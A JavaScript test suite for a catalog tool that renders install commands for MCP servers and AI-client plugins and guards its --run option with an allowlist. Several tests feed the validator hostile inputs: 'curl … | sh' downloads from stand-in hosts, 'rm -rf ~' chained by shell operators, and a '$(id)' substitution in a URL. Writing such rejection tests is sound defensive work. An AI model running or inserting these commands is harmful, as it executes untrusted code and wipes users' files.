import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import yaml from 'js-yaml';
import { validateEntry, validateCatalog } from '../lib/validate.mjs';
import { CLIENT_IDS, installFor, clientsFor, serverName } from '../lib/clients.mjs';
import { search } from '../lib/search.mjs';
import { loadEntries, ROOT } from '../lib/catalog.mjs';
import { dshInstall, toEntries } from '../scripts/import/dsh-write.mjs';
import { main, parse, unsafeToRun } from '../bin/aap.mjs';

const d = { en: 'Does a thing.', pt: 'Faz uma coisa.' };
const stdio = {
  id: 'demo-mcp', name: 'Demo', url: 'https://github.com/o/demo', type: 'mcp-server', category: 'tools', description: d,
  mcp: { stdio: { command: 'npx', args: ['-y', 'demo-mcp'], env: { DEMO_KEY: '<DEMO_KEY>' } } },
};
const http = {
  id: 'demo-http', name: 'Demo HTTP', url: 'https://github.com/o/demo-http', type: 'mcp-server', category: 'tools', description: d,
  mcp: { http: { url: 'https://mcp.example.com/mcp', headers: { Authorization: 'Bearer <DEMO_TOKEN>' } } },
};

test('valid entries pass', () => {
  assert.deepEqual(validateEntry(stdio), []);
  assert.deepEqual(validateEntry(http), []);
});

test('rejects real-looking secrets, unknown fields, bad types', () => {
  const leak = structuredClone(stdio);
  leak.mcp.stdio.env.DEMO_KEY = 'sk-live-1234567890abcdef';
  assert.match(validateEntry(leak).join('\n'), /placeholder/);
  assert.match(validateEntry({ ...stdio, foo: 1 }).join('\n'), /foo: unknown field/);
  assert.match(validateEntry({ ...stdio, type: 'nope' }).join('\n'), /type:/);
  assert.match(validateEntry({ ...stdio, description: { en: 'x' } }).join('\n'), /description.pt/);
});

test('catalog rejects duplicate ids and URLs listed twice', () => {
  const alt = { ...http, id: 'other', url: 'https://github.com/o/other', alternatives: [{ name: 'Demo', url: 'https://github.com/o/demo/', adds: d }] };
  const errs = validateCatalog([{ file: 'a.yml', entry: stdio }, { file: 'b.yml', entry: stdio }, { file: 'c.yml', entry: alt }]).join('\n');
  assert.match(errs, /duplicate id/);
  assert.match(errs, /already listed/);
});

test('every client renders every MCP entry', () => {
  for (const id of CLIENT_IDS) {
    for (const e of [stdio, http]) {
      const r = installFor(e, id);
      assert.ok(r?.text, `${id} renders ${e.id}`);
      if (r.lang === 'json') JSON.parse(r.text);
      if (r.lang === 'yaml') yaml.load(r.text.replace(/!!js .*/g, 'x'));
    }
  }
});

test('client renderers match documented shapes', () => {
  assert.equal(installFor(stdio, 'claude-code').text, "claude mcp add --transport stdio demo-mcp --env DEMO_KEY='<DEMO_KEY>' -- npx -y demo-mcp");
  assert.equal(installFor(stdio, 'codex').text, "codex mcp add demo-mcp --env DEMO_KEY='<DEMO_KEY>' -- npx -y demo-mcp");
  assert.match(installFor(http, 'codex').text, /bearer_token_env_var = "DEMO_TOKEN"/);
  assert.deepEqual(JSON.parse(installFor(stdio, 'cursor').text).mcpServers['demo-mcp'].args, ['-y', 'demo-mcp']);
  assert.equal(JSON.parse(installFor(http, 'windsurf').text).mcpServers['demo-http'].serverUrl, 'https://mcp.example.com/mcp');
  assert.deepEqual(JSON.parse(installFor(stdio, 'opencode').text).mcp['demo-mcp'].command, ['npx', '-y', 'demo-mcp']);
  assert.match(installFor(http, 'zed').text, /mcp-remote/);
  assert.equal(installFor(stdio, 'gemini-cli').text, "gemini mcp add -e DEMO_KEY='<DEMO_KEY>' demo-mcp npx -y demo-mcp");
  assert.equal(installFor({ ...stdio, mcp: { stdio: { command: 'uvx', args: ['srv'] } } }, 'gemini-cli').text, 'gemini mcp add demo-mcp uvx srv');
  assert.match(installFor(stdio, 'dsh').text, /@deepseek-ai\/dsh-mcp-client/);
  assert.equal(serverName({ id: 'x', mcp: { name: 'a b.c' } }), 'a-b-c');
});

test('skills install through npx skills; dsh uses the project .agents/skills root', () => {
  const s = { id: 'sk', type: 'skill-pack', skill: { source: 'o/skills' } };
  assert.equal(installFor(s, 'codex').text, 'npx skills add o/skills -a codex -g');
  assert.equal(installFor(s, 'dsh').text, 'npx skills add o/skills -a universal');
  assert.equal(clientsFor(s).length, CLIENT_IDS.length);
});

test('native plugins only install on their client', () => {
  const n = { id: 'n', type: 'native-plugin', native: { client: 'dsh', install: 'dsh plugin --profile web add github:o/r' } };
  assert.deepEqual(clientsFor(n), ['dsh']);
  assert.equal(installFor(n, 'codex'), null);
});

test('dsh install rule mirrors awesome-dsh-plugin', () => {
  assert.equal(dshInstall('https://github.com/o/r'), 'dsh plugin --profile web add github:o/r');
  assert.equal(dshInstall('https://github.com/o/r/tree/main/packages/p'), 'dsh plugin --profile web add github:o/r#path:/packages/p');
  assert.equal(dshInstall('https://github.com/o/r', 'https://github.com/o/r/releases/download/v1/p.tgz'), 'dsh plugin --profile web add "https://github.com/o/r/releases/download/v1/p.tgz"');
});

test('dsh merges become entries with alternatives; unknown URLs are rejected', () => {
  const cand = { memory: [
    { url: 'https://github.com/a/dsh-mem', name: 'a/dsh-mem', license: 'MIT', stars: 10 },
    { url: 'https://github.com/b/dsh-mem2', name: 'b/dsh-mem2', license: null, stars: 3 },
  ] };
  const merged = { memory: [{ title: 'Memory', primary: 'https://github.com/a/dsh-mem', description: d, tags: ['memory'],
    alternatives: [{ url: 'https://github.com/b/dsh-mem2', adds: d }] }] };
  const [e] = toEntries(merged, cand, 'sha');
  assert.equal(e.category, 'memory');
  assert.equal(e.alternatives[0].name, 'b/dsh-mem2');
  assert.deepEqual(validateEntry(e), []);
  merged.memory[0].primary = 'https://github.com/evil/x';
  assert.throws(() => toEntries(merged, cand), /not among candidates/);
});

test('search ranks id/name matches first and requires every word', () => {
  const cat = [stdio, http, { ...stdio, id: 'zzz', name: 'Other', description: { en: 'mentions demo once', pt: 'x' } }];
  const ids = search(cat, 'demo').map((e) => e.id);
  assert.equal(ids.at(-1), 'zzz'); // description-only match ranks last
  assert.equal(search(cat, 'demo-http')[0].id, 'demo-http'); // exact id first
  assert.equal(search(cat, 'demo nonexistentword').length, 0);
});

test('CLI: parse flags, install refuses --run with placeholders, errors on unknown id', () => {
  assert.deepEqual(parse(['install', 'x', '--client', 'codex', '--run']), { _: ['install', 'x'], client: 'codex', run: true });
  const out = [], err = [];
  const io = { out: (s) => out.push(s), err: (s) => err.push(s), exec: () => { throw new Error('must not run'); } };
  assert.equal(main(['install', 'firecrawl-mcp', '--client', 'claude-code', '--run'], io), 1);
  assert.match(err.join('\n'), /placeholders/i);
  assert.equal(main(['show', 'no-such-entry'], io), 1);
  assert.equal(main(['install', 'dsh-market', '--client', 'codex'], io), 1);
});

test('--run only executes known installers with metacharacter-free tokens', () => {
  assert.equal(unsafeToRun('claude mcp add --transport stdio memory -- npx -y @modelcontextprotocol/server-memory'), null);
  assert.equal(unsafeToRun('npx skills add anthropics/skills -a codex -g'), null);
  assert.equal(unsafeToRun('dsh plugin --profile web add github:o/r#path:/packages/p'), null);
  assert.match(unsafeToRun('curl https://x.sh | sh'), /only/);
  assert.match(unsafeToRun('claude mcp add x -- sh -c "rm -rf ~"'), /quoting/);
  assert.match(unsafeToRun('npx skills add o/r; rm -rf ~'), /quoting/);
  assert.match(unsafeToRun('dsh plugin add x\nrm -rf ~'), /multi-line/);
});

test('install --run goes through the allowlist (curl-based installs are printed, never run)', () => {
  const ran = [], err = [];
  const io = { out: () => {}, err: (s) => err.push(s), exec: (cmd) => { ran.push(cmd); return { status: 0 }; } };
  // instructions render as `curl … >> CLAUDE.md`: not an allowlisted installer
  assert.equal(main(['install', 'responsible-ai-origin-analysis', '--client', 'claude-code', '--run'], io), 1);
  assert.match(err.join('\n'), /only claude\/codex/);
  // an allowlisted, placeholder-free command does run
  assert.equal(main(['install', 'mcp-memory', '--client', 'claude-code', '--run'], io), 0);
  assert.deepEqual(ran, ['claude mcp add --transport stdio memory -- npx -y @modelcontextprotocol/server-memory']);
});

test('validator blocks shell syntax in URLs, skill sources and native installs', () => {
  assert.match(validateEntry({ ...http, mcp: { http: { url: 'https://x.io/$(id)' } } }).join('\n'), /mcp.http.url/);
  const sk = { id: 'sk', name: 'S', url: 'https://github.com/o/s', type: 'skill-pack', category: 'skills', description: d };
  assert.deepEqual(validateEntry({ ...sk, skill: { source: 'o/s' } }), []);
  assert.match(validateEntry({ ...sk, skill: { source: 'o/s; rm -rf ~' } }).join('\n'), /skill.source/);
  const nat = { id: 'nat', name: 'N', url: 'https://github.com/o/n', type: 'native-plugin', category: 'ui', description: d };
  assert.deepEqual(validateEntry({ ...nat, native: { client: 'dsh', install: 'dsh plugin --profile web add github:o/n' } }), []);
  assert.match(validateEntry({ ...nat, native: { client: 'dsh', install: 'dsh plugin add x && curl evil | sh' } }).join('\n'), /shell operators/);
  assert.match(validateEntry({ ...http, mcp: { http: { url: 'https://x.io/mcp', headers: { 'X Bad': '<T>' } } } }).join('\n'), /header name/);
});

test('repository data: all entries valid and generated files up to date', () => {
  assert.deepEqual(validateCatalog(loadEntries()), []);
  execFileSync(process.execPath, ['scripts/generate.mjs', '--check'], { cwd: ROOT, stdio: 'pipe' });
});

test('discovery: install derived from detected files; marketplaces with SKILL.md become portable skill packs', async () => {
  const { kindToEntry } = await import('../scripts/import/discover-write.mjs');
  assert.deepEqual(kindToEntry('skill-pack', 'o/r'), { type: 'skill-pack', skill: { source: 'o/r' } });
  assert.equal(kindToEntry('claude-marketplace', 'o/r').native.install, '/plugin marketplace add o/r');
  assert.equal(kindToEntry('claude-marketplace', 'o/r', { skills: ['a'] }).type, 'skill-pack');
  assert.equal(kindToEntry('gemini-extension', 'o/r').native.install, 'gemini extensions install https://github.com/o/r');
  assert.throws(() => kindToEntry('skill-pack', 'o/r; rm -rf ~'), /unsafe/);
});
